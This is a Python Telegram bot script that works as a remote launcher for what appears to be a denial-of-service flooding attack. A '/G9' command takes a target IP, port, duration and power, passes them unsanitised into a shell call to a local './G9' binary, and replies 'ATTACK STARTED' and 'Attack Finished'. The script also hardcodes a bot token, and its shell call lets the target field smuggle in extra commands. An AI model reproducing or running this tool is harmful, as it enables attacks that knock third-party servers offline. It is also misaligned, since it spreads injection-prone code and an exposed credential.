#!/usr/bin/python3

import telebot
import subprocess

# Insert your Telegram bot token here
bot = telebot.TeleBot('6472534758:AAGTOvmuiBnQSpQdmM2oNX_g1YJZtxLH8bA')

# Handler for /G9 command
@bot.message_handler(commands=['G9'])
def handle_G9(message):
    command = message.text.split()
    if len(command) == 5:  # Accept target, port, and time
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer
        power = int(command[4])  # Convert power to integer
        
        if time > 500:
            response = "Error: Time interval must be less than 501."
        else:
            start_attack_reply(message, target, port, time, power)  # Call start_attack_reply function
            full_command = f"./G9 {target} {port} {time} 200"
            subprocess.run(full_command, shell=True)  # Run the command in the shell
            response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
    else:
        response = '''Usage: /G9 <target> <port> <time> <power>
Example: /G9 192.168.1.1 80 60 300
'''
    bot.reply_to(message, response)

# Function to handle the reply when users run the /G9 command
def start_attack_reply(message, target, port, time, power):
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: G9\nBy G9"
    bot.reply_to(message, response)

# Command handler for /help
@bot.message_handler(commands=['help'])
def handle_help(message):
    response = '''Available commands:
    
/G9 <target> <port> <time> <power> - Start G9 attack
'''
    bot.reply_to(message, response)

# Start the bot
bot.polling()
